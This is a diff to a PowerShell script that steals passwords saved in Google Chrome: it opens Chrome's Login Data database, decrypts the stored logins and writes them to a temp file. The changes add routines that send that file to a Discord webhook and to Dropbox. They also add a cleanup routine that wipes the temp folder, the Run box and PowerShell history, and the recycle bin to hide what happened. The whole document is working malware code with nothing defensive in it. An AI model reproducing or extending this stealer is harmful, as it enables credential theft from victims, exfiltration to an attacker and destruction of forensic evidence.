@@ -1,7 +1,3 @@
-param (
-    [string]$dc
-)
-
 $dataPath="$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Default\\Login Data"
 $query = "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0"
 
@@ -22,40 +18,7 @@ if ((Get-Host).Version.Major -eq 7) {
     $decoder = [Security.Cryptography.AesGcm]::New($masterKey)
 }
 
-$outputFilePath = "$env:TEMP\chrome_passwords.txt"  # Output file path
-$webhookUrl = "$dc"
-
-# Function to append data to the output file
-function AppendToFile {
-    param (
-        [string]$Data
-    )
-    Add-Content -Path $outputFilePath -Value $Data
-}
-
-# Function to send data to Discord webhook
-function Upload-Discord {
-    [CmdletBinding()]
-    param (
-        [parameter(Position=0,Mandatory=$False)]
-        [string]$file,
-        [parameter(Position=1,Mandatory=$False)]
-        [string]$text 
-    )
-
-    $Body = @{
-      'username' = $env:username
-      'content' = $text
-    }
-
-    if (-not ([string]::IsNullOrEmpty($text))){
-        Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json)
-    }
-
-    if (-not ([string]::IsNullOrEmpty($file))){
-        curl.exe -F "file1=@$file" $webhookUrl
-    }
-}
+$outputFilePath = "$env:TEMP\chrome_pass.txt"  # Output file path
 
 Add-Type -AssemblyName System.Security
 Add-Type @"
@@ -160,5 +123,96 @@ while([WinSQLite3]::Step($stmt) -eq 100) {
     }
 }
 
-# Send the contents of the output file to the Discord webhook
-Upload-Discord -file $outputFilePath
+############################################################################################################################################################
+
+function AppendToFile {
+    param (
+        [string]$Data
+    )
+    Add-Content -Path $outputFilePath -Value $Data
+}
+
+############################################################################################################################################################
+
+# Upload output file to Dropbox
+
+function DropBox-Upload {
+
+	[CmdletBinding()]
+	param (
+	[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+	[Alias("f")]
+	[string]$SourceFilePath
+	) 
+	$outputFile = Split-Path $SourceFilePath -leaf
+	$TargetFilePath="/$outputFile"
+	$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+	$authorization = "Bearer " + $db
+	$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+	$headers.Add("Authorization", $authorization)
+	$headers.Add("Dropbox-API-Arg", $arg)
+	$headers.Add("Content-Type", 'application/octet-stream')
+	Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+}
+
+if (-not ([string]::IsNullOrEmpty($db))) {
+	DropBox-Upload -f $env:TEMP/--chrome-pass.txt
+}
+
+############################################################################################################################################################
+
+function Upload-Discord {
+
+    [CmdletBinding()]
+    param (
+        [parameter(Position=0,Mandatory=$False)]
+        [string]$file,
+        [parameter(Position=1,Mandatory=$False)]
+        [string]$text 
+        )
+
+    $hookurl = "$dc"
+
+    $Body = @{
+        'username' = $env:username
+        'content' = $text
+        }
+
+    if (-not ([string]::IsNullOrEmpty($text))) {
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+    };
+
+    if (-not ([string]::IsNullOrEmpty($file))) {
+        curl.exe -F "file1=@$file" $hookurl
+    }
+}
+
+if (-not ([string]::IsNullOrEmpty($dc))) {
+    Upload-Discord -file "$env:TEMP/--chrome-pass.txt"
+}
+
+############################################################################################################################################################
+
+function Clean-Exfil { 
+
+	# empty temp folder
+	rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+	# delete run box history
+	reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
+
+	# Delete powershell history
+	Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+
+	# Empty recycle bin
+	Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+}
+
+############################################################################################################################################################
+
+if (-not ([string]::IsNullOrEmpty($ce))) {
+	Clean-Exfil
+}
+
+
+RI $env:TEMP/--chrome-pass.txt
